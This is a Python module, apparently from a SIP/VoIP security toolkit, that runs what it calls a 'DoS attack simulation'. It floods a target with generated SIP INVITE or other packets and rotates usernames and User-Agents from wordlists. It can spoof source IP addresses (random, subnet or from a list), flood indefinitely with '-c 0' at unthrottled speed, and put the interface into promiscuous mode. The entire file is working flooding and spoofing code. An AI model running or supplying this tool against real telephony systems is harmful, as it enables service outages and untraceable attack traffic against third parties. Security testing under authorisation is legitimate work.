import logging
import random
import sys
import time

from scapy.all import IP
from tqdm import tqdm

from src.core import errors, net_utils, sip_packet, theme

logger = logging.getLogger(__name__)


def _summarize(sent, i, target, failed, last_error, elapsed, send_time_total, send_time_count):
    # Instrumentation (To-Do.md item 3c): real-time-ish feedback on how the
    # attack actually performed, not just a final pass/fail count - packets
    # actually sent per second of wall-clock time, and the average time each
    # individual generate_packet() call took (socket send/scapy send, not
    # network RTT - DAS's flood mode never waits for a response).
    pps = sent / elapsed if elapsed > 0 else 0.0
    avg_send_ms = (send_time_total / send_time_count * 1000) if send_time_count else 0.0
    stats = f"{pps:.1f} packets/sec, avg send time {avg_send_ms:.1f} ms"
    if failed:
        lines = [
            f"{sent} of {i} packets actually sent to {target}, {failed} failed (last error: {last_error}).",
            stats + ".",
        ]
    else:
        lines = [f"{sent} packet(s) sent to {target}.", stats + "."]
    return theme.panel("SIP-DAS summary", lines)


def run(args, conf, client_ip, client_netmask):
    message_type = args.message_type.lower() if args.message_type else "invite"

    if args.library and (args.random or args.subnet or args.manual):
        logger.warning(
            "-r/-s/-m (IP spoofing) has no effect with -l (socket library mode): "
            "spoofing requires raw Scapy packets. Drop -l to actually spoof."
        )

    value_errors = []
    if args.manual and not args.library and not args.manual_ip_list:
        value_errors.append("Error: -m/--manual requires --il/--manual-ip-list to specify the IP list file.")
    if args.subnet and not args.library and not client_netmask:
        value_errors.append("Error: -s/--subnet (subnet spoofing) requires an interface with a valid netmask.")
    net_utils.check_value_errors(value_errors)

    # Wordlists are read once up front instead of on every loop iteration -
    # with the default flood counter (~1e8) re-opening these files per
    # packet added significant, pointless I/O. Uses net_utils.read_lines, the
    # single wordlist-reading function shared with SIP-NES/SIP-ENUM.
    to_user_choices = net_utils.read_lines(args.to_user)
    from_user_choices = net_utils.read_lines(args.from_user)
    sp_user_choices = net_utils.read_lines(args.sp_user)
    # No isalnum predicate here: userAgent.txt entries like
    # "Brcm Callctrl/1.5.1.0 MxSF/v3.2.6.26" aren't alphanumeric, and
    # filtering them out would silently empty DAS's User-Agent rotation.
    user_agent_choices = net_utils.read_lines(args.user_agent)
    manual_ip_choices = None
    if args.manual and not args.library:
        # --il is documented (DAS_USAGE, README) as accepting SIP-NES's own
        # output/ip_list.txt ("ip;user_agent;type" per line); read_ip_list is
        # the single place that format is parsed (also used by enum.py), and
        # it also works for a plain one-IP-per-line file.
        manual_ip_choices = net_utils.read_ip_list(args.manual_ip_list)
        if not manual_ip_choices:
            value_errors.append(f"Error: {args.manual_ip_list} contains no usable IP entries.")
    net_utils.check_value_errors(value_errors)

    # args.target_network never changes across the loop, so the routing-
    # table lookup behind IP(dst=...).src is an invariant - compute it once
    # instead of on every iteration (it's discarded immediately anyway
    # whenever -r/-s/-m override it below).
    default_client_ip = IP(dst=args.target_network).src

    net_utils.promisc("on", conf.iface)
    try:
        net_utils.printInital("DoS attack simulation", conf.iface, client_ip)

        counter = int(args.counter)
        # -c 0 means "flood indefinitely" (matches hping3/nping convention).
        # The old `while i < counter` made -c 0 a degenerate no-op (0 packets
        # sent); nobody runs "-c 0" meaning that on purpose.
        infinite = counter == 0
        # 1/pps is the minimum wall-clock gap between packets; None disables
        # throttling entirely (flood as fast as possible, the historical
        # default).
        pps_interval = 1.0 / args.pps if args.pps else None
        i = 0
        sent = 0
        failed = 0
        last_error = None
        start_time = time.time()
        send_time_total = 0.0
        send_time_count = 0

        # elapsed/_summarize live in `finally` so Ctrl+C still shows the
        # partial-run summary instead of throwing it away - previously a
        # KeyboardInterrupt raised SystemExit before these lines could run,
        # which is the single most common way a real flood/scan actually
        # ends. KeyboardInterrupt propagates on through this finally to
        # cli.main()'s own handler (still prints "Interrupted by user." and
        # exits 130), so exit-code behavior is unchanged.
        try:
            with tqdm(total=None if infinite else counter, desc="Progress", unit="pkt", disable=not sys.stdout.isatty()) as pbar:
                while infinite or i < counter:
                    toUser = random.choice(to_user_choices)
                    fromUser = random.choice(from_user_choices)
                    spUser = random.choice(sp_user_choices)
                    userAgent = random.choice(user_agent_choices)

                    client = default_client_ip
                    if args.random and not args.library:
                        client = net_utils.randomIPAddress()
                    if args.manual and not args.library:
                        client = random.choice(manual_ip_choices)
                    if args.subnet and not args.library:
                        client = net_utils.randomIPAddressFromNetwork(client_ip, client_netmask, False)

                    send_protocol = "socket" if args.library else "scapy"
                    packet = sip_packet.sip_packet(
                        str(message_type), str(args.target_network), str(args.dest_port),
                        str(client), str(fromUser), str(toUser), str(userAgent), str(spUser),
                        send_protocol, mtu=args.mtu,
                    )
                    i += 1
                    send_start = time.time()
                    try:
                        packet.generate_packet()
                        sent += 1
                        send_time_total += time.time() - send_start
                        send_time_count += 1
                    except errors.PacketSendError as e:
                        failed += 1
                        last_error = str(e)
                        logger.debug("Packet %d/%d failed: %s", i, "inf" if infinite else counter, last_error)
                    pbar.update(1)
                    if pps_interval is not None:
                        remaining = pps_interval - (time.time() - send_start)
                        if remaining > 0:
                            time.sleep(remaining)
        finally:
            elapsed = time.time() - start_time
            logger.info(_summarize(sent, i, args.target_network, failed, last_error, elapsed, send_time_total, send_time_count))
    finally:
        net_utils.promisc("off", conf.iface)
